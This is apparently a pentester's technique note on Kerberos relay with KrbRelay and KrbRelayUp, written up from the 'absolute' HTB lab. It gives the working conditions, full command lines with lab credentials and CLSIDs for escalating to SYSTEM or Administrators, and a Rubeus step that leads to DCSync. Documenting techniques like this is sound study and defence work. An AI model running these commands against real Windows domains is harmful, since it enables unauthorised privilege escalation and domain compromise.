---
type: technique
title: Kerberos Relay (KrbRelay / KrbRelayUp)
tags: [ad, windows, kerberos, relay, privilege-escalation]
platforms: [windows]
mitre: [T1557]
updated: 2026-07-09
---

# Kerberos Relay (KrbRelay / KrbRelayUp)

## What it is
Relay an authentication request — captured from a privileged local context (typically **SYSTEM**) — through a malicious COM/RPC server back to a network service (LDAP) on the DC, performing authenticated actions *as* that privileged identity. The Kerberos analogue of NTLM relay, which sidesteps NTLM-relay mitigations (signing) because Kerberos is involved.

- **KrbRelay** — manual; you pick the relay target and action (e.g. add a user to a group).
- **KrbRelayUp** — automates the common path on a non-DC host: relay → shadow credential on the **machine account** → SYSTEM.

## When it works
- Target is **missing the October 2022 patch** that broke `rpc→ldap` relay.
- **LDAP signing is disabled** (the Windows default — there's often no clean check; assume yes on unpatched hosts).
- You have an **interactive** session to coerce SYSTEM auth. WinRM remoting does **not** work (creds aren't in memory the same way) — bridge with [[runascs]] using **logon type 9** (`-l 9`).

## How it's done
```
# Find a port SYSTEM is allowed to bind
CheckPort.exe                       # e.g. port 10

# Relay SYSTEM → LDAP and add a user to a group (CLSID chosen by OS build)
RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \
  ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 \
   -add-groupmember administrators winrm_user"

# KrbRelayUp alt: forge shadow cred on the machine account, then ask a TGT (PKINIT) with Rubeus
RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \
  ".\KrbRelayUp.exe relay -m shadowcred -cls {354ff91b-5e49-4bdc-a8e6-1cb6c6877182}"
Rubeus.exe asktgt /user:DC$ /certificate:<b64> /password:<pw> /getcredentials /show /nowrap
```
Tools: [[runascs]], [[rubeus]], KrbRelay/KrbRelayUp/CheckPort binaries.

## Observed on
- [[absolute]] — two variants shown: (1) KrbRelay added `winrm_user` to Administrators → `root.txt`; (2) KrbRelayUp forged a shadow cred on `DC$` → machine-account hash → [[dcsync]]. Both run via RunasCs logon type 9 from a WinRM session.

## Variants & pitfalls
- **Logon type matters.** RunasCs defaults to type 2 (blocked when NTLM is disabled); type 9 (NewCredentials/Network) is what made it work here.
- Need a valid **CLSID** for an RPC service — pick from the per-OS list in the KrbRelay README.
- The DC machine-account hash from the KrbRelayUp path is especially powerful because `DC$` is **not** in Protected Users → enables [[dcsync]].

## See also
[[shadow-credentials]], [[dcsync]], [[ntlm-disabled-protected-users]], [[runascs]], [[rubeus]]
